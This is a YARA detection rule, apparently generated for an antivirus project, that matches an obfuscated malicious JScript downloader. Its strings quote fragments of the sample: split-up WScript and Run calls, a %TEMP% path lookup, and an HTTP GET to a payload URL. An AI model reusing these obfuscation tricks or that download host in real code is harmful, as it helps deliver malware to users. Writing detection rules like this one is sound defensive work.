rule sig_20160428_71b2570c3ab80074f54a13593c7ad7bc {
  meta:
    description = "datamaliciousorder - file 20160428_71b2570c3ab80074f54a13593c7ad7bc.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1c84985201ee9e34cd0e5ead5fec9ec0705809f9b3f66e67c5125217f6838165"

  strings:
    $s1  = "function FzxXuuQwhNptCbwMwgLjg() {return KclSpsBgtHqgMfyCdiVdt[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "return WxiFhuYbbHbmTmhSlfWps - FvvEgiOxaSlxLubMphWzh;};" fullword ascii
    $s3  = "var KclSpsBgtHqgMfyCdiVdt = function SoqRljSvwTczTplIodUqg() {return RzmEyhPcfZmfMnaMleFws[EpkCeiUddAvrKupSwyLnf](\"WScript\"+\"" ascii
    $s4  = "function EaaJwbOkrTmuBynPagRug(WxiFhuYbbHbmTmhSlfWps, FvvEgiOxaSlxLubMphWzh){InjCizPlrHywQxgUgmPgv = InjCizPlrHywQxgUgmPgv * 1; " ascii
    $s5  = "var RzmEyhPcfZmfMnaMleFws = this[\"WScript\"];" fullword ascii
    $s6  = "var KclSpsBgtHqgMfyCdiVdt = function SoqRljSvwTczTplIodUqg() {return RzmEyhPcfZmfMnaMleFws[EpkCeiUddAvrKupSwyLnf](\"WScript\"+\"" ascii
    $s7  = "function BfkBpcRljFxkIcrSexYpz(HdbKbsWkkJmnQavTdaZlx){KclSpsBgtHqgMfyCdiVdt[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s8  = "function BfkBpcRljFxkIcrSexYpz(HdbKbsWkkJmnQavTdaZlx){KclSpsBgtHqgMfyCdiVdt[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s9  = "function FzxXuuQwhNptCbwMwgLjg() {return KclSpsBgtHqgMfyCdiVdt[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s10 = "if (UicEynLzoAcwQscHymEal[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s11 = "function LphHryBckKqbAdzSlxPcy(){return PsxYbvEwvBluYvvGmaOon + \"\";};" fullword ascii
    $s12 = "function EaaJwbOkrTmuBynPagRug(WxiFhuYbbHbmTmhSlfWps, FvvEgiOxaSlxLubMphWzh){InjCizPlrHywQxgUgmPgv = InjCizPlrHywQxgUgmPgv * 1; " ascii
    $s13 = "function YinUupLxrAcqDqcIxjRee() {return ((PjtUklAehQzdUszBymQbx == true) && (PjtUklAehQzdUszBymQbx == EhwDtzXgfSkrKijOhsKih)) ?" ascii
    $s14 = "function YinUupLxrAcqDqcIxjRee() {return ((PjtUklAehQzdUszBymQbx == true) && (PjtUklAehQzdUszBymQbx == EhwDtzXgfSkrKijOhsKih)) ?" ascii
    $s15 = "UicEynLzoAcwQscHymEal[RszDabLsdLszMchMdoRtq](\"G\" + \"ET\", \"http://tribalsnedkeren.dk/n4jca\", false);" fullword ascii
    $s16 = "function ShoHelDagGlqMfsZqsSyd(PapYniVplJszDnxSfdZxk) {var EqyVarIugDpbYbvCnyPbs = (1, 2, 3, 4, 5, PapYniVplJszDnxSfdZxk); retur" ascii
    $s17 = "function IvdGgpAfoHjgWivQnhLzv(){return 23;};" fullword ascii
    $s18 = "}while (BwjNjmLfgBbyHbvCzjFvw);" fullword ascii
    $s19 = "function OijVusSwwPvfEqgChtLlg()" fullword ascii
    $s20 = "var PjtUklAehQzdUszBymQbx = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}